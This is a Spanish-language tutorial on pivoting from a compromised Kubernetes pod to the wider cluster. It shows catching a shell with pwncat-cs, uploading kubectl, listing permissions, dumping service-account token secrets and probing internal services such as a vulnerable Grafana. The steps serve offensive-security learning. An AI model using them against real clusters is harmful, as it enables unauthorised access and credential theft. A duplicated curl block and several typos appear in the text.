# Atacar un cluster de Kubernetes: dedes un pod a todo el cluster


 Esta basado en el video : https://www.youtube.com/watch?v=iD_klswHJQs


## Enumeración 

Si hacemos una nmap a una IP que tiene una aplicación que está en un cluster:

```console
$ nmap -v <IP>

PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http

```
Obtendremos los puertos 80/443 de la aplicación y probablemente el puerto 22.

## Establecimiento inicial

Suponer que hemos conseguido abrir un shell en el contenedor aprovechando una vulnerabilidad como inyección de OS o de SQL.

Para ello se puede usar netcat pero hay herramientas interesantes como `pwncat-cs`:
```console
$ sudo pip install pwncat-cs

$ pwncat-cs -lp <LPORT>
```

Una vez abierto el shell, probablemente seamos `root` aunque veremos que el conjunto de instrucciones de las que disponemos es bastante limitado dentro del contenedor.

¿Cómo se sabe que estás dendro de un contenedor?

Hay varios indicios:

- Probablemente en habrá un archivo `/.dockerenv`
- El comando `env` tendrá información de diversos compenentes :
   ```
   KUBERNETES_PORT_443_TCP_PROTO=
   KUBERNETES_PORT_443_TCP_ADDR=
   KUBERNETES_SERVICE_HOST=
   KUBERNETES_PORT=
   ...
   GRAFANA_...=
   SYRINGE_...=
   ```


## Instalar kubectl

`kubectl`es la herramienta que permite gestionar un cluster de Kubernetes. Por tanto, es imprescindible para poder ejecurtarlo en el pod comprometido.

Una opción es subirlo al pod desde la maquina atacante con un `upload`, hacerlo accesible con un servidor web, ...

```console
cd /tmp

pwncat$ upload ./kubectl

chmod +x ./kubectl

```

Una vez disponemos de `kubectl` podemos comenzar a lanzar comandos contra el cluster de kubernetes.

Lo primero que podemos hacer es ver qué podemos hacer en  el clúster. Para ello, el siguiente comando nos dará esa respuesta
```console

$ ./kubectl auth can-i --list 

...
secrets []     []       [get list]
   [/openapi]  []       [get]       
    [/version] []       [get]      
...
```

Lo más interesante es que `secrets` son accesibles:
```console

$ ./kubectl get secrets

default-token-xxxxx   kubernetes.io/service-account-token    3  24d
developer-token-yyy   kubernetes.io/service-account-token    3  24d
   
...
```
Para ver el contenido de un  `secrets` se puede usar:

```console
$ ./kubectl get secrets developer-token-yyy -o json

{
   data:{
      ...
   }
}
...
```

Probablemente no tengamos permisos para ver otros pods que estén en ejecución:

```console
$ ./kubectl get pods
Error from server (Forbidden): ...
```

```console
$ curl -vvv http://grafana:3000 


$ curl -L http://grafana:3000 

```
Como conocemos que puede haber otros servicios ejecutando en el clúster (ver los resultados del comando `env`) intentamos conectar a esos servicios conociendo la IP y el puerto:

```console
$ curl -vvv http://grafana:3000 


$ curl -L http://grafana:3000 

```

Y buscar versiones vulnerables en alguno de los servicios. Por ejemplo, Grafana 8.3.0 que es vulnerable a Directory Traversal y es posible leer cualquier archivo.















